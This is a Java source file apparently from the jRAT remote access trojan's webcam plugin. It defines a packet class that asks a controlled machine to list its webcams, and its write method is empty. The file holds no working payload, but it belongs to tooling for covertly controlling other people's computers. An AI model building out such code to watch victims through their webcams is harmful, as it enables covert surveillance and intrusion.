package se.jrat.plugin.webcam.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.ArrayList;
import java.util.List;

import jrat.api.PacketBuilder;
import jrat.api.RATObject;

public class Packet121ListWebcams extends PacketBuilder {

	public Packet121ListWebcams(RATObject rat) {
		super(WebcamPlugin.LIST_WEBCAM_HEADER, rat);
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		
	}

}
